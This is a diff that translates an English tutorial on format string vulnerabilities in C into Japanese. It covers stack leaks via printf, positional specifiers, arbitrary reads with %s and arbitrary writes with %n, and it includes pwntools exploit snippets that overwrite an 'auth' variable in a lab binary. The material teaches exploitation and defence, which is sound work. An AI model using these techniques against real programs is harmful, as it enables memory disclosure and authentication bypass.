@@ -1,14 +1,14 @@
 ---
-description: Reading memory off the stack
+description: スタックからメモリを読み取る
 ---
 
-# Format String Bug
+# 書式文字列バグ(Format String Bug)
 
-Format String is a dangerous bug that is easily exploitable. If manipulated correctly, you can leverage it to perform powerful actions such as reading from and writing to arbitrary memory locations.
+書式文字列(Format String)は、悪用しやすい危険なバグです。うまく操作すれば、任意のメモリ位置への読み書きといった強力な操作が可能になります。
 
-### Why it exists
+### なぜ存在するのか
 
-In C, certain functions can take "format specifier" within strings. Let's look at an example:
+C では、一部の関数が文字列内に「書式指定子(format specifier)」を取れます。例を見てみましょう。
 
 ```c
 int value = 1205;
@@ -16,7 +16,7 @@ int value = 1205;
 printf("Decimal: %d\nFloat: %f\nHex: 0x%x", value, (double) value, value);
 ```
 
-This prints out:
+出力は次のようになります。
 
 ```text
 Decimal: 1205
@@ -24,9 +24,9 @@ Float: 1205.000000
 Hex: 0x4b5
 ```
 
-So, it replaced `%d` with the value, `%f` with the float value and `%x` with the hex representation.
+このように、`%d` は値に、`%f` は浮動小数点の値に、`%x` は 16 進表現に置き換えられました。
 
-This is a nice way in C of formatting strings \(string concatenation is quite complicated in C\). Let's try print out the same value in hex 3 times:
+これは C で文字列を整形する便利な方法です(C では文字列の連結はかなり面倒です)。同じ値を 16 進数で 3 回出力してみましょう。
 
 ```c
 int value = 1205;
@@ -34,13 +34,13 @@ int value = 1205;
 printf("%x %x %x", value, value, value);
 ```
 
-As expected, we get
+期待どおりの結果になります。
 
 ```text
 4b5 4b5 4b5
 ```
 
-What happens, however, if we _don't have enough arguments for all the format specifiers_?
+では、書式指定子の数に対して_引数が足りない_とどうなるでしょうか?
 
 ```c
 int value = 1205;
@@ -52,13 +52,13 @@ printf("%x %x %x", value);
 4b5 5659b000 565981b0
 ```
 
-Erm... what happened here?
+えっと...何が起きたのでしょうか?
 
-The key here is that `printf` expects as many parameters as format string specifiers, and in 32-bit it grabs these parameters from the stack. If there aren't enough parameters on the stack, it'll just _grab the next values_ - essentially _leaking values off the stack_. And that's what makes it so dangerous.
+重要なのは、`printf` は書式指定子と同じ数のパラメータがあると期待しており、32 ビットではそのパラメータをスタックから取り出すという点です。スタックに十分なパラメータがなければ、単に_次の値を取り出して_しまいます。つまり実質的に_スタックの値をリークして_しまうのです。これが書式文字列バグが危険な理由です。
 
-### How to abuse this
+### どう悪用するか
 
-Surely if it's a bug in the code, the attacker can't do much, right? Well the real issue is when C code takes user-provided input and prints it out using `printf`.
+コードのバグなら、攻撃者にできることは大してないのでは? 実は本当の問題は、C のコードがユーザーの入力をそのまま `printf` で出力する場合に起こります。
 
 {% file src="../../.gitbook/assets/fmtstr\_arb\_read.zip" caption="Format String" %}
 
@@ -75,7 +75,7 @@ int main(void) {
 }
 ```
 
-If we run this normally, it works at expected:
+通常どおり実行すると、期待どおりに動作します。
 
 ```text
 $ ./test 
@@ -84,7 +84,7 @@ yes
 yes
 ```
 
-But what happens if we input format string specifieres, such as `%x`?
+では、`%x` のような書式指定子を入力するとどうなるでしょうか?
 
 ```text
 $ ./test
@@ -93,31 +93,31 @@ $ ./test
 f7f74080 0 5657b1c0 782573fc 20782520
 ```
 
-It reads values off the stack and returns them as the developer wasn't expecting so many format string specifiers. 
+開発者がこれほど多くの書式指定子を想定していなかったため、スタックから値を読み出して返してしまいます。
 
-### Choosing Offsets
+### オフセットの選択
 
-To print the same value 3 times, using
+同じ値を 3 回出力するのに、次のように書くと
 
 ```c
 printf("%x %x %x", value, value, value);
 ```
 
-Gets tedious - so, there is a better way in C.
+面倒になります。そこで C にはもっと良い方法があります。
 
 ```c
 printf("%1$x %1$x %1$x", value);
 ```
 
-The `1$` between tells printf to use the **first parameter**. However, this also means that attackers can read values an arbitrary offset from the top of the stack - say we know there is a canary at the 6th `%p` - instead of sending `%p %p %p %p %p %p` we can just do `%6$p`. This allows us to be much more efficient.
+間にある `1$` は、printf に**最初のパラメータ**を使うよう指示します。しかしこれは、攻撃者がスタックの先頭から任意のオフセット位置の値を読めることも意味します。たとえば 6 番目の `%p` にカナリアがあるとわかっていれば、`%p %p %p %p %p %p` と送る代わりに `%6$p` と送るだけで済みます。これでずっと効率的になります。
 
-### Arbitrary Reads
+### 任意読み取り
 
-In C, when you want to use a string you use a **pointer** to the start of the string - this is essentially a value that represents a memory address. So when you use the `%s` format specifier, it's the _pointer_ that gets passed to it. That means instead of reading a value of the stack, you read _the value in the memory address it points at_.
+C では、文字列を使うとき、文字列の先頭への**ポインタ**を使います。これは本質的にメモリアドレスを表す値です。したがって `%s` 書式指定子を使うと、渡されるのは_ポインタ_です。つまり、スタックから値を読み取る代わりに、_そのポインタが指すメモリアドレスの値_を読み取ります。
 
-Now this is all very _interesting_ - if you can find a value on the stack that happens to correspond to where you want to read, that is. But what if we could specify where we want to read? Well... we can.
+これは確かに_興味深い_のですが、読みたい場所に対応する値がたまたまスタックにあれば、の話です。では、読みたい場所を自分で指定できたらどうでしょうか? 実は、できます。
 
-Let's look back at the previous program and its output:
+先ほどのプログラムとその出力をもう一度見てみましょう。
 
 ```text
 $ ./test
@@ -126,7 +126,7 @@ $ ./test
 f7f74080 0 5657b1c0 782573fc 20782520 25207825
 ```
 
-You may notice that the last two values contain the hex values of `%x` . That's because we're reading the buffer. Here it's at the 4th offset - if we can write an address then point `%s` at it, we can get an arbitrary write!
+最後の 2 つの値に、`%x` の 16 進値が含まれていることに気づくかもしれません。これはバッファを読んでいるからです。ここではバッファは 4 番目のオフセットにあります。アドレスを書き込んで `%s` でそれを指せば、任意読み取りができます!
 
 ```text
 $ ./vuln 
@@ -136,10 +136,10 @@ ABCD|0x44434241
 ```
 
 {% hint style="info" %}
-`%p` is a pointer; generally, it returns the same as `%x` just precedes it with a `0x` which makes it stand out more
+`%p` はポインタです。一般に `%x` と同じ結果を返しますが、先頭に `0x` が付くので目立ちやすくなります。
 {% endhint %}
 
-As we can see, we're reading the value we inputted. Let's write a quick pwntools script that write the location of the ELF file and reads it with `%s` - if all goes well, it should read the first bytes of the file, which is always `\x7fELF`. Start with the basics:
+ご覧のとおり、入力した値を読み取れています。ELF ファイルの場所を書き込み、それを `%s` で読み取る pwntools スクリプトを簡単に書いてみましょう。うまくいけば、ファイルの最初のバイト(常に `\x7fELF`)が読み取れるはずです。まず基本から始めます。
 
 ```python
 from pwn import *
@@ -160,7 +160,7 @@ $ python3 exploit.py
 [*] b'DCBA|0x41424344'
 ```
 
-Nice it works. The base address of the binary is `0x8048000`, so let's replace the `0x41424344` with that and read it with `%s`:
+うまく動きました。バイナリのベースアドレスは `0x8048000` なので、`0x41424344` をそれに置き換えて `%s` で読み取ってみます。
 
 ```python
 from pwn import *
@@ -174,9 +174,9 @@ p.sendline(payload)
 log.info(p.clean())
 ```
 
-It doesn't work.
+うまくいきません。
 
-The reason it doesn't work is that `printf` stops at null bytes, and the very first character is a null byte. We have to put the format specifier first.
+原因は、`printf` が null バイトで止まるためで、最初の文字がまさに null バイトだからです。書式指定子を先頭に置く必要があります。
 
 ```python
 from pwn import *
@@ -190,10 +190,10 @@ p.sendline(payload)
 log.info(p.clean())
 ```
 
-Let's break down the payload:
+ペイロードを分解してみましょう。
 
-* We add 4 `|` because we want the address we write to fill one memory address, not half of one and half another, because that will result in reading the wrong address
-* The offset is `%8$p` because the start of the buffer is generally at `%6$p`. However, memory addresses are 4 bytes long each and we already have 8 bytes, so it's two memory addresses further along at `%8$p`. 
+* `|` を 4 つ追加するのは、書き込むアドレスが、あるメモリアドレスの半分と次のアドレスの半分にまたがるのではなく、ちょうど 1 つのアドレスに収まるようにするためです。またがると、間違ったアドレスを読むことになります。
+* オフセットが `%8$p` なのは、バッファの先頭が通常 `%6$p` にあるためです。ただしメモリアドレスは 1 つあたり 4 バイトで、すでに 8 バイトあるので、2 つ先の `%8$p` になります。
 
 ```text
 $ python3 exploit.py
@@ -202,9 +202,9 @@ $ python3 exploit.py
 [*] b'0x8048000||||'
 ```
 
-> It still stops at the null byte, but that's not important because we get the output; the address is still written to memory, just not printed back.
+> それでも null バイトで止まりますが、出力が得られているので問題ありません。アドレスはメモリに書き込まれており、ただ出力されないだけです。
 
-Now let's replace the `p` with an `s`.
+次に `p` を `s` に置き換えます。
 
 ```text
 $ python3 exploit.py
@@ -213,13 +213,13 @@ $ python3 exploit.py
 [*] b'\x7fELF\x01\x01\x01||||'
 ```
 
-Of course, `%s` will **also** stop at a null byte as strings in C are terminated with them. We have worked out, however, that the first bytes of an ELF file up to a null byte are `\x7fELF\x01\x01\x01`.
+もちろん `%s` も、C の文字列は null で終端されるため、null バイトで止まります。しかし、ELF ファイルの先頭から null バイトまでが `\x7fELF\x01\x01\x01` であることはこれでわかりました。
 
-### Arbitrary Writes
+### 任意書き込み
 
-Luckily C contains a rarely-used format specifier `%n`. This specifier takes in a pointer \(memory address\) and writes there the _number of characters written so far_. If we can control the input, we can control how many characters are written an also where we write them.
+幸い、C には、あまり使われない書式指定子 `%n` があります。これはポインタ(メモリアドレス)を受け取り、そこへ_これまでに出力した文字数_を書き込みます。入力を制御できれば、出力する文字数も、書き込む場所も制御できます。
 
-Obviously, there is a _small_ flaw - to write, say, `0x8048000` to a memory address, we would have to write that many characters - and generally buffers aren't quite that big. Luckily there are other format string specifiers for that. I fully recommend you watch [this video](https://www.youtube.com/watch?v=t1LH9D5cuK4) to completely understand it, but let's jump into a basic binary.
+もちろん、_ちょっとした_問題があります。たとえば `0x8048000` をメモリアドレスに書き込むには、その数だけ文字を出力しなければならず、普通バッファはそれほど大きくありません。幸い、そのための別の書式指定子があります。完全に理解するために、[この動画](https://www.youtube.com/watch?v=t1LH9D5cuK4)をぜひ見てください。ここでは基本的なバイナリに進みます。
 
 {% file src="../../.gitbook/assets/fmtstr\_arb\_write.zip" caption="Format String - Arbitrary Write" %}
 
@@ -243,11 +243,11 @@ int main() {
 }
 ```
 
-Simple - we need to overwrite the variable `auth` with the value 10. Format string vulnerability is obvious, but there's also no buffer overflow due to a secure `fgets`.
+単純です。変数 `auth` を値 10 で上書きする必要があります。書式文字列の脆弱性は明らかですが、安全な `fgets` を使っているのでバッファオーバーフローはありません。
 
-#### Work out the location of auth
+#### auth の場所を調べる
 
-As it's a global variable, it's within the binary itself. We can check the location using `readelf` to check for symbols.
+グローバル変数なので、バイナリ自体の中にあります。`readelf` でシンボルを調べれば場所がわかります。
 
 ```text
 $ readelf -s auth | grep auth
@@ -255,11 +255,11 @@ $ readelf -s auth | grep auth
     57: 0804c028     4 OBJECT  GLOBAL DEFAULT   24 auth
 ```
 
-Location of `auth` is `0x0804c028`.
+`auth` の場所は `0x0804c028` です。
 
-#### Writing the Exploit
+#### エクスプロイトを書く
 
-We're lucky there's no null bytes, so there's no need to change the order.
+幸い null バイトがないので、順序を入れ替える必要はありません。
 
 ```text
 $ ./auth 
@@ -269,7 +269,7 @@ Password:
 0x64 0xf7f9f580 0x8049199 (nil) 0x1 0xf7ff5980 0x25207025 0x70252070 0x20702520
 ```
 
-Buffer is the 7th `%p`.
+バッファは 7 番目の `%p` です。
 
 ```python
 from pwn import *
@@ -288,7 +288,7 @@ p.sendline(payload)
 print(p.clean().decode('latin-1'))
 ```
 
-And easy peasy:
+あっさり成功しました。
 
 ```text
 [+] Starting local process './auth': pid 4045
@@ -300,26 +300,26 @@ Auth is 10
 Authenticated!
 ```
 
-### Pwntools
+### pwntools
 
-As you can expect, pwntools has a handy feature for automating `%n` format string exploits:
+想像のとおり、pwntools には `%n` の書式文字列エクスプロイトを自動化する便利な機能があります。
 
 ```python
 payload = fmtstr_payload(offset, {location : value})
 ```
 
-The `offset` in this case is `7` because the 7th `%p` read the buffer; the location is **where** you want to write it and the value is **what**. Note that you can add as many location-value pairs into the dictionary as you want.
+この場合の `offset` は `7` です。7 番目の `%p` がバッファを読んでいるためです。location は**どこ**に書くか、value は**何を**書くかです。辞書には location と value のペアをいくつでも追加できます。
 
 ```python
 payload = fmtstr_payload(7, {AUTH : 10})
 ```
 
-You can also grab the location of the `auth` symbol with pwntools:
+pwntools では `auth` シンボルの場所を取得することもできます。
 
 ```python
 elf = ELF('./auth')
 AUTH = elf.sym['auth']
 ```
 
-> Check out the pwntools tutorials for more cool features
+> pwntools のチュートリアルで、ほかにも便利な機能を確認してみてください。
 
